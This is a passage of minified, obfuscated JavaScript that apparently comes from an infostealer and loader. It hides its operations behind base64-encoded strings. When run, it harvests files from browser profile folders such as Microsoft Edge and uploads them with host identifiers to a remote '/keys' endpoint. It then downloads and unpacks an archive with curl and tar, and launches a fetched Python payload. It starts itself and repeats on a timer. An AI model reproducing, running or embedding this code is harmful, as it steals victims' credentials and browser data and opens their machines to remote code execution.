$=`${e}/${s}/${a}`;m($)&&t.push({[v]:r[c]($),[V]:{[Y]:`flk4_${l}`}})}catch(t){}try{const a=`${e}/${s}/${$}`;m(a)&&t.push({[v]:r[c](a),[V]:{[Y]:`flk3_${l}`}})}catch(t){}try{const a=`${e}/${s}/${n}`;m(a)&&t.push({[v]:r[c](a),[V]:{[Y]:`fllj_${l}`}})}catch(t){}}}catch(t){}return Q(t),t},P=l("cm1TeW5j"),D="XC5weXBccHl0",K="aG9uLmV4ZQ",tt=51476592;let ct=0;const at=()=>{const t=l("cDIuemlw"),c=`${s()}${l("L3Bkb3du")}`,a=`${td}\\${l("cC56aQ")}`,$=`${td}\\${t}`;if(ct>=tt+4)return;const n=l("cmVuYW1lU3luYw"),e=l("cmVuYW1l");if(r[p](a))try{var h=r[z](a);h.size>=tt+4?(ct=h.size,r[e](a,$,(t=>{if(t)throw t;$t($)}))):(ct>=h.size?(r[P](a),ct=0):ct=h.size,nt())}catch(t){}else{const t=`${l("Y3VybCAtTG8")} "${a}" "${c}"`;ex(t,((t,c,e)=>{if(t)return ct=0,void nt();try{ct=tt+4,r[n](a,$),$t($)}catch(t){}}))}},$t=async t=>{const c=`${l("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,a,$)=>{if(c)return r[P](t),void(ct=0);r[P](t),lt()}))},rt=async()=>{let t=[];const c=l(u),a=l(S);try{const $=l(b);let n="";if(n=`${hd}${l(X)}${l(_)}`,n&&""!==n&&m(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?G:`${W} ${e}`}/${c}`;try{if(!m(l))continue;const c=`${n}/ld_${e}`;m(c)?t.push({[v]:r[a](c),[V]:{[Y]:`plld_${e}`}}):r[$](l,c,(t=>{let c=[{[v]:r[a](l),[V]:{[Y]:`plld_${e}`}}];Q(c)}))}catch(t){}}}catch(t){}return Q(t),t};function nt(){setTimeout((()=>{at()}),2e4)}const et=async()=>{let t="2C3";try{t+=zv[l("YXJndg")][1]}catch(t){}(async(t,c)=>{const a={ts:e.toString(),type:o,hid:U,ss:t,cc:c.toString()},$=s(),r={[w]:`${$}${l("L2tleXM")}`,[f]:a};try{rq[L](r,((t,c,a)=>{}))}catch(t){}})("jv",t)},lt=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${l(D+K)}`;r[p](`${t}`)?(()=>{const t=s(),c=l(d),a=l(Z),$=l(i),n=l(y),e=`${t}${c}/${o}`,h=`${hd}${n}`,p=`"${hd}${l(D+K)}" "${h}"`;try{r[P](h)}catch(t){}rq[a](e,((t,c,a)=>{if(!t)try{r[$](h,a),ex(p,((t,c,a)=>{}))}catch(t){}}))})():at()}else(()=>{const t=s(),c=l(d),a=l(i),$=l(Z),n=l(y),e=l("cHl0aG9u"),h=`${t}${c}/${o}`,p=`${hd}${n}`;let u=`${e}3 "${p}"`;rq[$](h,((t,c,$)=>{t||(r[a](p,$),ex(u,((t,c,a)=>{})))}))})()}));const st=async()=>{try{e=Date.now(),await(async()=>{U=hs,await et();try{const t=h("~/");await A(q,0),await A(F,1),await A(B,2),"w"==pl[0]?(pa=`${t}${l(x)}${l("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${l(N)}`,await C(pa,"3_",!1)):"d"==pl[0]?(await H(),await M(),await E()):"l"==pl[0]&&(await I(),await rt(),await O())}catch(t){}})(),lt()}catch(t){}};st();let ht=setInterval((()=>{1,c<5?st():clearInterval(ht)}),6e5);
